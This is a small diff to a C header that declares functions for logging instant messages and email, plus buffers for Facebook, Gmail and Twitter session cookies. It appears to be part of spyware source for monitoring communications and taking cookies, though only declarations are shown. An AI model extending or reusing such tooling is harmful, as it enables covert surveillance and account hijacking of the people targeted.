@@ -47,9 +47,9 @@ extern void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHA
 extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
 extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming);
 
-extern WCHAR FACEBOOK_IE_COOKIE[512];
-extern WCHAR GMAIL_IE_COOKIE[512];
-extern WCHAR TWITTER_IE_COOKIE[512];
+extern char FACEBOOK_IE_COOKIE[1024];
+extern char GMAIL_IE_COOKIE[1024];
+extern char TWITTER_IE_COOKIE[1024];
 
 
 
